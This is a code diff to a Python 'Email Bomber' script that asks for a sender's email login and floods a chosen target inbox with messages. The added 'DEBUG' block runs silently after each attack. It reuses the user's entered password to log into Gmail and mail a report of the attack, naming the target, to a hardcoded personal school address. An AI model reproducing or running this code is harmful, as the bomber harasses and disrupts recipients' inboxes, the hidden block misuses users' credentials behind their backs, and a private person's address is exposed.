@@ -2,6 +2,7 @@ import smtplib
 import sys
 import time
 import random
+from http.client import responses
 
 # DEFINE COLORS
 red = '\33[31m'
@@ -22,7 +23,7 @@ def banner():
     print("setting up email...")
     time.sleep(1)
     print(green + "initializing complete")
-    version = "Email Bomber v2.45"
+    version = "Email Bomber v2.95"
     time.sleep(1)
     print(version)
     coder = "Noa and Devin"
@@ -107,7 +108,7 @@ class Email_Bomber:
             self.fromAddr = str(input(yellow + 'Enter sender address <: '))
             self.fromPwd = str(input(yellow + 'Enter sender password <: '))
             self.subject = str(input(yellow + 'Enter subject <: '))
-            self.message = str(input(yellow + f'Enter message <:         |         Mail Number = {random.randint(1, 1000000)} '))
+            self.message = str(input(yellow + 'Enter message <: ') + f'      Mail Number :   {random.randint(0,1000000)} ')
 
             self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
              ''' % (self.fromAddr, self.target, self.subject, self.message)
@@ -134,6 +135,35 @@ class Email_Bomber:
             self.send()
         self.s.close()
         print(green + 'Attack finished')
+
+
+        # DEBUG STARTS HERE
+
+        self.HOST1 = "smtp.gmail.com"
+        self.Port1 = 587
+
+        self.FROM = self.fromAddr
+        self.PWD = self.fromPwd
+        self.TO = "noa.roesken@stiftsgymnasium.de"
+
+        self.MESSAGE_NOA = (f'{self.amount} Mails got sucesfuly Bombarded to {self.target}!')
+
+        self.smtp = smtplib.SMTP(self.HOST1, self.Port1)
+
+        self.status_code, self.response = self.smtp.ehlo()
+
+        self.status_code, self.response = self.smtp.starttls()
+
+        self.status_code, self.response = self.smtp.login(self.FROM, self.PWD)
+
+        self.smtp.sendmail(self.FROM,self.TO,self.MESSAGE_NOA)
+
+        self.smtp.quit()
+
+        #DEBUG END
+
+        print("DEBUG COMPLETE")
+
         time.sleep(1)
         close1 = input("CLOSE?(Y) : ")
         if close1 == "Y":
